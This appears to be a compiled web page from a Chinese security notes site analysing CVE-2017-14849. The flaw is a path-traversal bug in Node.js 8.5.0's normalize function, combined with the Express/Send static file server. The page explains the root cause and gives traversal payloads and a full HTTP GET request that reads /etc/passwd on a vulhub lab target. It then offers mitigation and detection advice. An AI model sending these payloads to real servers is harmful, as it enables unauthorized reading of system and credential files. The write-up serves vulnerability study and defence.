import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,a as e,b as s,d as r,e as d,r as i,o as c}from"./app-_WqHyd2I.js";const p="/DailyNotes/assets/03-EpDCTYzy.png",l="/DailyNotes/assets/01-BhgArpg5.png",h="/DailyNotes/assets/02-DI8x9n8h.png",m="/DailyNotes/assets/04-CCeyIjE9.png",g={},u={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"};function f(b,o){const t=i("ExternalLinkIcon");return c(),n("div",null,[o[1]||(o[1]=e("h1",{id:"漏洞名称-node-js-目录穿越漏洞",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞名称-node-js-目录穿越漏洞"},[e("span",null,"漏洞名称：Node.js 目录穿越漏洞")])],-1)),o[2]||(o[2]=e("h2",{id:"漏洞介绍",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞介绍"},[e("span",null,"漏洞介绍")])],-1)),e("blockquote",null,[e("p",null,[e("a",u,[o[0]||(o[0]=r("国家信息安全漏洞库 (cnnvd.org.cn)",-1)),d(t)])])]),o[3]||(o[3]=s('<p>express 这类 web 框架，通常会提供了静态文件服务器的功能，这些功能依赖于<code>normalize</code>函数。比如，express 在判断 path 是否超出静态目录范围时，就用到了<code>normalize</code>函数，Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致<code>normalize</code>函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。</p><p>当然，<code>normalize</code>的 BUG 可以影响的绝非仅有 express，更有待深入挖掘。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>任意文件读取</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><p>Node.js 8.5.0 + Express 3.19.0-3.21.2 Node.js 8.5.0 + Express 4.11.0-4.15.5</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h2><blockquote><p>参考链接：https://security.tencent.com/index.php/blog/msg/121</p></blockquote><p>原因是 Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致向上层跳跃的时候（如<code>../../../../../../etc/passwd</code>），在中间位置增加<code>foo/../</code>（如<code>../../../foo/../../../../etc/passwd</code>），即可使<code>normalize</code>返回<code>/etc/passwd</code>，但实际上正确结果应该是<code>../../../../../../etc/passwd</code>。具体如下：</p><p>Express 依赖 Send 组件，Send 组件 0.11.0-0.15.6 版本 pipe()函数中，如图：</p><figure><img src="'+p+`" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>Send 模块通过<code>normalize(&#39;.&#39; + sep + path)</code>标准化路径 path 后，并没有赋值给 path，而是仅仅判断了下是否存在目录跳转字符。如果我们能绕过目录跳转字符的判断，就能把目录跳转字符带入 545 行的<code>join(root, path)</code>函数中，跳转到我们想要跳转到的目录中，这是 Send 模块的一个 bug，目前已经修复。</p><p>再来看 Node.js，Node.js 8.5.0 对 path.js 文件中的<code>normalizeStringPosix</code>函数进行了修改，使其能够对路径做到如下的标准化：</p><pre><code>assert.strictEqual(path.posix.normalize(&#39;bar/foo../..&#39;), &#39;bar&#39;);
</code></pre><p>新的修改带来了问题，通过单步调试发现，可以通过<code>foo../../</code>和目录跳转字符一起注入到路径中，<code>foo../../</code>可以把变量<code>isAboveRoot</code>设置为<code>false</code>（代码 161 行），并且在代码 135 行把自己删掉；变量<code>isAboveRoot</code>为<code>false</code>的情况下，可以在<code>foo../../</code>两边设置同样数量的跳转字符，让他们同样在代码 135 行把自己删除，这样就可以构造出一个带有跳转字符，但是通过<code>normalizeStringPosix</code>函数标准化后又会全部自动移除的 payload，这个 payload 配合上面提到的 Send 模块 bug 就能够成功的返回一个我们想要的物理路径，最后在 Send 模块中读取并返回文件。</p><p>该漏洞是建立在文件夹通过 express.static 来托管的情况下，因为在这种情况下才会使用 normalize 函数进行 path 标准化。</p><p>比如代码这样写：</p><pre><code>app.use(express.static(path.join(__dirname, &#39;static&#39;)));
</code></pre><p>那么 payload 应该是</p><pre><code>/../../../a/../../../../etc/passwd
</code></pre><p>但代码如果是这样写的话：</p><pre><code>app.use(\`\`&#39;/static&#39;\`\`,express.static(path.join(__dirname, &#39;static&#39;)));
</code></pre><p>那么 payload 应该为：</p><pre><code>/static/../../../a/../../../../etc/passwd
</code></pre><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h2><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><p>vulhub/node/CVE-2017-14849</p><hr><h3 id="利用方式" tabindex="-1"><a class="header-anchor" href="#利用方式"><span>利用方式</span></a></h3><p>访问<code>http://your-ip:3000/</code>即可查看到一个 web 页面，其中引用到了文件<code>/static/main.js</code>，说明其存在静态文件服务器。</p><figure><img src="`+l+`" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><p>发送如下数据包，即可读取 passwd：</p><pre><code>GET /static/../../../a/../../../../etc/passwd HTTP/1.1
Host: your-ip:3000
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre><figure><img src="`+h+'" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>或者访问其他文件：</p><figure><img src="'+m+'" alt="04" tabindex="0" loading="lazy"><figcaption>04</figcaption></figure><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议"><span>用户处置建议</span></a></h3><p>避免使用受影响版本的 node.js</p><hr><h3 id="安全产品检测建议" tabindex="-1"><a class="header-anchor" href="#安全产品检测建议"><span>安全产品检测建议</span></a></h3><p>检测类似<code>../../../foo/../../../../etc/passwd</code>的目录遍历形式</p><hr><blockquote><p>https://drive.weixin.qq.com/s?k=AD4AGAfCAAw86qs7kb)</p></blockquote>',49))])}const N=a(g,[["render",f]]),j=JSON.parse('{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/Node.js/node_CVE-2017-14849.html","title":"漏洞名称：Node.js 目录穿越漏洞","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"漏洞分析","description":"漏洞名称：Node.js 目录穿越漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) express 这类 web 框架，通常会提供了静态文件服务器的功能，这些功能依赖于normalize函数。比如，express 在判断 path 是否超出静态目录范围时，就用到了normalize函数，Node.js 8.5.0 对目录进行normal...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/Node.js/node_CVE-2017-14849.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"漏洞名称：Node.js 目录穿越漏洞"}],["meta",{"property":"og:description","content":"漏洞名称：Node.js 目录穿越漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) express 这类 web 框架，通常会提供了静态文件服务器的功能，这些功能依赖于normalize函数。比如，express 在判断 path 是否超出静态目录范围时，就用到了normalize函数，Node.js 8.5.0 对目录进行normal..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"漏洞分析"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"漏洞名称：Node.js 目录穿越漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]},{"level":2,"title":"漏洞利用","slug":"漏洞利用","link":"#漏洞利用","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方式","slug":"利用方式","link":"#利用方式","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[{"level":3,"title":"用户处置建议","slug":"用户处置建议","link":"#用户处置建议","children":[]},{"level":3,"title":"安全产品检测建议","slug":"安全产品检测建议","link":"#安全产品检测建议","children":[]}]}],"git":{"createdTime":1731665131000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":3}]},"readingTime":{"minutes":2.87,"words":861},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/Node.js/node_CVE-2017-14849.md","localizedDate":"2024年11月15日","excerpt":"\\n","autoDesc":true}');export{N as comp,j as data};
